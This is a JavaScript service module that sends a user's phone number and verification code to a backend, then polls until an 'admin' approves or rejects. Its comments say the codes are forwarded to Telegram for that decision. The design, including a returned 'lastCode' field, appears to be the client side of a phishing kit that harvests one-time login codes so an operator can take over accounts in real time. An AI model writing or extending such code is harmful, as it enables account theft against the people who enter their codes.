// /src/services/telegramService.js (Pure JS)
export async function sendPhoneNumber(phoneDigits) {
  const phone = Array.isArray(phoneDigits) ? phoneDigits.join('') : String(phoneDigits ?? '');
  const r = await fetch('/api/send-phone', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone })
  });
  if (!r.ok) return false;
  const data = await r.json();
  return !!data.ok;
}

export async function sendVerificationCode(phoneDigits, codeDigits, requestId) {
  const phone = Array.isArray(phoneDigits) ? phoneDigits.join('') : String(phoneDigits ?? '');
  const code  = Array.isArray(codeDigits)  ? codeDigits.join('')  : String(codeDigits  ?? '');
  const r = await fetch('/api/verify-code', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone, code, requestId })
  });
  if (!r.ok) return { success:false, error:`HTTP ${r.status}` };
  const data = await r.json();
  if (!data?.ok) return { success:false, approved:false };

  // After sending code to Telegram, wait for admin decision (approve/reject)
  const approved = await waitForApproval(phone, { intervalMs: 2000, timeoutMs: 120000 });
  return { success: true, approved };
}

// NEW: read current approval status for a phone
export async function checkApproval(phoneDigits) {
  const phone = Array.isArray(phoneDigits) ? phoneDigits.join('') : String(phoneDigits ?? '');
  const r = await fetch('/api/check-status', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone })
  });
  if (!r.ok) return { ok:false, approved:false };
  return r.json(); // { ok:true, approved:boolean, lastCode?:string, status?:string }
}

// NEW: poll until approved or timeout; exit early if explicitly rejected
export async function waitForApproval(phoneDigits, { intervalMs=2000, timeoutMs=120000 } = {}) {
  const phone = Array.isArray(phoneDigits) ? phoneDigits.join('') : String(phoneDigits ?? '');
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const s = await checkApproval(phone); // { ok, approved, status }
      if (s?.approved) return true;
      if (s?.status && String(s.status).toLowerCase() === 'rejected') return false;
    } catch {}
    await new Promise(r => setTimeout(r, intervalMs));
  }
  return false;
}
